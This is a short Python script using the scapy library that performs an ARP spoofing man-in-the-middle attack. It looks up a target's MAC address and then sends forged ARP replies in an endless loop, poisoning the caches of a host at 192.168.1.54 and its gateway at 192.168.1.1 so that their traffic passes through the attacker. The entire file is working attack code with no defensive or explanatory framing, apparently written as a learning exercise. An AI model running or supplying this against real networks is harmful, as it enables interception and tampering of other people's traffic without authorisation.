import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_request
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# packet_to_target  = scapy.ARP(op=2, pdst="192.168.1.54", hwdst="08:00:27:9e:3f:33", psrc="192.168.1.1")
# packet_to_router  = scapy.ARP(op=2, pdst="192.168.1.1", hwdst="64:fb:92:97:9c:c8", psrc="192.168.1.54")
# print(packet_to_router.summary())
# print(packet_to_router.show())
packets_send = 0
try:
  while True:
    spoof("192.168.1.54" , "192.168.1.1")
    spoof("192.168.1.1" , "192.168.1.54")
    packets_send = packets_send + 2
    print("\r[+] Packets sent: "+ str(packets_send), end = "")
except KeyboardInterrupt:
    print("\n[.] Detecting CTRL + C.......Quitting")
   